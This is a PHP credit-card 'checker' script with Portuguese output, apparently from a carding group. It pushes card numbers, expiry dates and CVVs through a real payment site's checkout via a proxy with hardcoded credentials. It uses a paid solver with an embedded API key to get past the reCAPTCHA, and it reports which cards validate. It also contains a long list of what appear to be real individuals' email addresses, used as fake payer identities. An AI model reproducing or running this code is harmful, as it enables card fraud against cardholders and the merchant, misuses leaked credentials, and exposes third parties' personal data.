<?php
error_reporting(0);
ignore_user_abort();

$time = time();

function getstr($string, $start, $end){

  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];

}

function multiexplode($delimiters, $string){
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

$dirCcookies = __DIR__.'/cookies/'.uniqid('cookie_').'.txt';

if (!is_dir(__DIR__.'/cookies/')){
  mkdir(__DIR__.'/cookies/' ,0777 , true);
}

foreach (glob(__DIR__."/cookies/*.txt") as $file) {
  if (strpos($file, 'cookie_') !== false){
    unlink($file);
  }
}

$lista = str_replace(array(" "), '/', $_GET['lista']);
$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);

if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex,$lista)){

die('<span class="text-danger">Declined</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Lista inválida. </span> ➔ <span class="text-warning">@RECARGASVIPONE</span><br>');
}

$lista = $_REQUEST['lista'];
$cc = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[0];
$mes = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[1];
$ano = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[2];
$cvv = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[3];
$mesFormatado = (strlen($mes) === 2 && $mes[0] === "0") ? $mes[1] : $mes;
$anocurto = substr($ano, -2);

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// $curl = curl_init();
// curl_setopt_array($curl, [
//   CURLOPT_URL => 'https://www.invertexto.com/gerador-email-temporario',
//   CURLOPT_RETURNTRANSFER => true,
//   CURLOPT_ENCODING => '',
//   CURLOPT_MAXREDIRS => 10,
//   CURLOPT_TIMEOUT => 30,
//   CURLOPT_CUSTOMREQUEST => 'GET',
//   CURLOPT_HTTPHEADER => [
//     'host: www.invertexto.com',
//     'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
//   ],
// ]);

// $inboxmail = curl_exec($curl);
// $emailgerado = getstr($inboxmail, 'id="email-input" value="','"' , 1);

// $url = "https://www.4devs.com.br/ferramentas_online.php";

// $curl = curl_init($url);
// curl_setopt($curl, CURLOPT_URL, $url);
// curl_setopt($curl, CURLOPT_POST, true);
// curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

// $headers = array(
//    "origin: https://www.4devs.com.br",
//    "referer: https://www.4devs.com.br/gerador_de_pessoas",
//    "Content-Type: application/x-www-form-urlencoded",
// );
// curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

// $data = "acao=gerar_pessoa&sexo=I&pontuacao=S&idade=0&cep_estado=&txt_qtde=1&cep_cidade=";

// curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
// curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
// curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
// $geradordedados = curl_exec($curl);

// $emailgerado = getstr($geradordedados, '"email":"','"' , 1);

$emails = [
    "yarkanpessoal@gmail.com", "blackstarsmarketing@gmail.com",
    "Camilakellen2@gmail.com", "contratelaarissanatalia@gmail.com", "erikvinicius1109@gmail.com",
    "kkaki7@gmail.com", "Marianamoreiramoreira53141@gmail.com.com", "Gabriellelustosadelima@gmail.com",
    "ws2953585@gmail.com", "Samyradeandra@gmail.com", "nonatoribeiro433@gmail.com",
    "Marianamoreiramoreira53141@gmail.com", "Tamiressilva2013@icloud.com", "nl1279853@gmail.com",
    "Samuelfariasbucell@gmail.com", "gamav0077@gmail.com", "saidobatoddytoddy@gmail.com",
    "Kookly1811@gmail.com", "Aleoliveiiraacm@icloud.com", "Mlauanda04@gmail.com",
    "tamaraalveslima100@gmail.com", "mpereira60209@gmail.com", "Flavioalisond@gmail.com",
    "giselepmacedo09@gmail.com", "viviana140730silva@gmail.com", "Grazielajessica869@gmail.com",
    "Lariza.rn93@gmail.com", "luzianaferreira33@gmail.com", "Angelicanarciso109@gmail.com",
    "camila.mayaraoli@gmail.com", "Franciscomanrique914@gmail.com", "mailsonreserva@gmail.com",
    "maliny145@gmail.com", "Aliccegata46@gmail.com", "jennifer.2021123@gmail.com",
    "alvaro.persil@icloud.com", "4naluciasouz@gmail.com", "Lanajl5@icloud.com",
    "Mariaclara.yvn@gmail.com", "pedrovtor097@gmail.com", "silvanyalima9@gmail.com",
    "Simonevieira23456@gmail.com", "claudiano.batista@hotmail.com", "andrezapnunes023@gmail.com",
    "anakercia158@gmail.com", "Patríciapmd123@icloud.com", "Fernadaaraujo133@gmail.com",
    "Fernadaarujo133@gmail.com", "Eduardagurgel429@gmail.com", "Simonevieira23456@gmail",
    "Cleitemar@icloud.com", "Cfaylla@gmail.com", "janielysousa056@gmail.com",
    "Soares.h@escolar.ifrn.edu.br", "Gessicaquaresma33@gmail.com", "larissagarcia1301@gmail.com",
    "jevanizabeserra@hotmail.com", "gabrielevm618@gmail.com", "Tatyoliver906@hotmail.com",
    "Glorialandim783@gmail.com", "Neyaraalves1990@gmail.com", "Tatyoliver906@gmail.com",
    "vianamarcio010@gmail.com", "paloma.isisvitoria@gmail.com", "ma675714@gmail.com",
    "Virlenealmeidaicloud.com", "Raynara.nunes123@gmail.com", "ga2375776@gmail.com",
    "marcos9962626@gmqil.com", "Pablokaik28@gmail.com", "mariairis029@gmail.com",
    "Cleeitoon2018@gmail.com", "Araujohotmail30@gmail.com", "Pablokaik05353@gmail.com",
    "costajakele@gmail.com", "carla77cristina8amorim@gmail.com", "simoneviera23456@gmail.com",
    "brendamatiasneres@gmail.com", "rodriguessilva5849@gmail.com", "Mizaelecosta55@gmail.com",
    "Aylaemanuelly.zy@gmail.com", "gs1353815@gmail.com", "rcassiaemail@gmail.com",
    "silvatiphane62@gmail.com", "alep94399@gmail.com", "Isamaira27@icloud.com",
    "honoriogurgel071@gmail.com", "Esebastiaopereira", "douguinhad405@gmail.com",
    "Aadry209@gmail.com", "brennasaraiva22@gmail.com", "lalaoasis@hotmail.com",
    "Silvakaua0948@gmail.com", "adrytoto500gmail.com", "amelia.rodrigues.maia@gmail.com",
    "mariairys029@gmail.com", "Thais.thais.jaiane@gmail.com", "emanoelmessias903@gmail.com",
    "Alexandre.filho141004@gmail.com", "evinha-maria96@hotmail.com", "mateusgsamz@gmail.com", "maycksousa152@gmail.com", "carmenrpehnn@outlook.com",
    "talvesbatista2018@gmail.com", "fnetolucas02@gmail.com", "ml1312934@gmailcom",
    "larabankk@gmail.com", "nataliaandrade026@gmail.com", "cesarvictordasilvamiguel7@gmail.com",
    "ezesantos123h@gmail.com", "isabel-de-queiros@gggg.com", "henzosoares671@gmail.com",
    "Tarsyla.fernanda@icloud.com", "serginzxiaomi@gmail.com", "miguelolivzzkk@gmail.com",
    "victormgimenes@hotmail.com", "b.ricardodesousa0@gmail.com", "ankarol275@gmail.com",
    "heavenlyzinn1533@gmail.com", "amandatoledox360@hotmail.com", "luizcafeo3737@gmail.com",
    "jzjsjskkejs@gmail.com", "geelanio12345@gmail.com", "Arlianacarlosdacruz@gmail.com",
    "Marinadejesussantos3108@gmail.com", "lustosagizelle34@gmail.com", "helena.goncalves24@icloud.com",
    "m39938522@gmail.com", "Carvalhoariany460@gmail.com", "paulominatoff@gmail.com",
    "Kaylanepereira122003@gmail.com", "santosvivih463@gmail.com", "hectorlucasferreiradossantos.2@gmail.com",
    "rua2denovenbro122@gmail.com", "Juliaalmeidaaa", "Geovani.mari23@icloud.com",
    "elivaneudanicolau32@gmail.com", "novasendity@gmail.com",
    "fernandaemilly110i@gmail.com", "Fernanda Emilly Oliveira Lopes de Freitas",
    "rachelpereiraalves563@gmail.com", "andrearigauddejesus@gmail.com",
    "admin@subway.solutions1", "Mariavanessa2090@gmail.com", "jokervendas2022@gmail.com",
    "Taynarafelix27@gmail.com", "strikermath14155@gmail.com", "kaugusto316@gmail.com"
];

shuffle($emails);

$emailgerado = $emails[array_rand($emails)];

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

$randodados = uniqid();
$randotelefone = rand(11111111,99999999);
$passaportegen = rand(11111,99999);

function GerarLetrasRandom($tamanho) {
    $letras = '';
    for ($i = 0; $i < $tamanho; $i++) {
        $letras .= chr(rand(97, 122));
    }
    return $letras;
}

$nomespah = GerarLetrasRandom(8);

/////////////////////////////////////////////////////////////////////////////////////////////////////////

$businessId = [4172, 8078, 2450];
$businessId = $businessId[array_rand($businessId)];

/////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.payzer.com/Payment/ExternalMake/businessId/'.$businessId.'');
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Host: www.payzer.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_COOKIEJAR, $dirCcookies);
curl_setopt($ch, CURLOPT_COOKIEFILE, $dirCcookies);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_PROXY, 'pr.oxylabs.io:7777');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'customer-pladix_3fjnv-cc-US:PladixFusion18+');
$getCookiesPage = curl_exec($ch);

preg_match('/location:\s(.*?)\s/i', $getCookiesPage, $matches);

if (!empty($matches[1])) {
    
    preg_match('/PM-[a-f0-9]+/', $matches[1], $pmMatch);

    if (!empty($pmMatch[0])) {
    $pmtokenpayment = $pmMatch[0];
    }
}

if ($pmtokenpayment == null) {

die("Erro ao obter links.");

}

/////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.payzer.com/Payment/ExternalMake/nt/'.$pmtokenpayment.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Host: www.payzer.com';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_COOKIEJAR, $dirCcookies);
curl_setopt($ch, CURLOPT_COOKIEFILE, $dirCcookies);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_PROXY, 'pr.oxylabs.io:7777');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'customer-pladix_3fjnv-cc-US:PladixFusion18+');
$externalMakePayments = curl_exec($ch);

/////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api-v2.nextcaptcha.com/getToken');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{
    "clientKey":"next_33de89347f701dabdda4ad262652b176fb",
    "task": {
        "type": "RecaptchaV2TaskProxyless",
        "websiteURL": "https://www.payzer.com/Payment/ExternalMake/nt/'.$pmtokenpayment.'",
        "websiteKey": "6LdRqCATAAAAAEtlufJFRFSgqjZeCRCKW978YHB5"
    }
}');
$next = curl_exec($ch);
$parts = explode("|", $next, 2);
$tokencap = $parts[1] ?? '';

/////////////////////////////////////////////////////////////////////////////////////////////////////////

$invoice = rand(1111,9999);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.payzer.com/Payment/ExternalMake/nt/'.$pmtokenpayment.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'nt='.$pmtokenpayment.'&businessId='.$businessId.'&businessCustomerId=&faid=&FirstName=casa&LastName=casa&Email=asgsagsga%40gmail.com&mobilePhone=&Amount=%24+5.00&InvoiceNumber='.$invoice.'&Memo=&PaymentMethod=card&CardNumber='.$cc.'&ExpirationMonth='.$mes.'&ExpirationYear=20'.$anocurto.'&Cvv='.$cvv.'&BillingZip=10080&AchAccountHolderType=&AchAccountType=&AchNameOnAccount=&achSameName=N&RoutingNumber=&AccountNumber=&VerifyAccountNumber=&g-recaptcha-response='.$tokencap.'&next=next');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Host: www.payzer.com';
$headers[] = 'Origin: https://www.payzer.com';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36';
$headers[] = 'Referer: https://www.payzer.com/Payment/ExternalMake/nt/'.$pmtokenpayment.'';
curl_setopt($ch, CURLOPT_COOKIEJAR, $dirCcookies);
curl_setopt($ch, CURLOPT_COOKIEFILE, $dirCcookies);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_PROXY, 'pr.oxylabs.io:7777');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'customer-pladix_3fjnv-cc-US:PladixFusion18+');
$sendPaymentPost = curl_exec($ch);

/////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.payzer.com/Payment/ExternalConfirmPayment/nt/'.$pmtokenpayment.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Host: www.payzer.com';
$headers[] = 'Referer: https://www.payzer.com/Payment/ExternalMake/nt/'.$pmtokenpayment.'';
curl_setopt($ch, CURLOPT_COOKIEJAR, $dirCcookies);
curl_setopt($ch, CURLOPT_COOKIEFILE, $dirCcookies);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_PROXY, 'pr.oxylabs.io:7777');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'customer-pladix_3fjnv-cc-US:PladixFusion18+');
$getExternalConfirm = curl_exec($ch);

/////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.payzer.com/Payment/ExternalConfirmPayment/nt/'.$pmtokenpayment.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryHyOeL2mSTm5L4n36
Content-Disposition: form-data; name="CardTerms"

N
------WebKitFormBoundaryHyOeL2mSTm5L4n36
Content-Disposition: form-data; name="CardTerms"

Y
------WebKitFormBoundaryHyOeL2mSTm5L4n36
Content-Disposition: form-data; name="name"

casa casa
------WebKitFormBoundaryHyOeL2mSTm5L4n36
Content-Disposition: form-data; name="expectedName"

casa casa
------WebKitFormBoundaryHyOeL2mSTm5L4n36
Content-Disposition: form-data; name="expectedSocialLast4"


------WebKitFormBoundaryHyOeL2mSTm5L4n36
Content-Disposition: form-data; name="MAX_FILE_SIZE"

104857600
------WebKitFormBoundaryHyOeL2mSTm5L4n36
Content-Disposition: form-data; name="completionDocument"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryHyOeL2mSTm5L4n36--');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Host: www.payzer.com';
$headers[] = 'Origin: https://www.payzer.com';
$headers[] = 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHyOeL2mSTm5L4n36';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36';
$headers[] = 'Referer: https://www.payzer.com/Payment/ExternalConfirmPayment/nt/'.$pmtokenpayment.'';
curl_setopt($ch, CURLOPT_COOKIEJAR, $dirCcookies);
curl_setopt($ch, CURLOPT_COOKIEFILE, $dirCcookies);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_PROXY, 'pr.oxylabs.io:7777');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'customer-pladix_3fjnv-cc-US:PladixFusion18+');
$resp = curl_exec($ch);
$returnmessage = getstr($resp, 'Your credit card payment was unsuccessful for the following reason: ','</div>' , 1);

/////////////////////////////////////////////////////////////////////////////////////////////////////////

if(strpos($resp, 'CVV mismatch')) {

die('<span class="text-success">Approved</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-success"> Cartão vinculado com sucesso. - (#'.$businessId.') </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@RECARGASVIPONE</span><br>');

}elseif(strpos($resp, 'Your credit card payment was unsuccessful for the following reason')) {

die('<span class="text-danger">Declined</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> '.$returnmessage.' - (#'.$businessId.') </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@RECARGASVIPONE</span><br>');

}else{

die('<span class="text-danger">Declined</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> '.$resp.' </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@RECARGASVIPONE</span><br>');

}

?>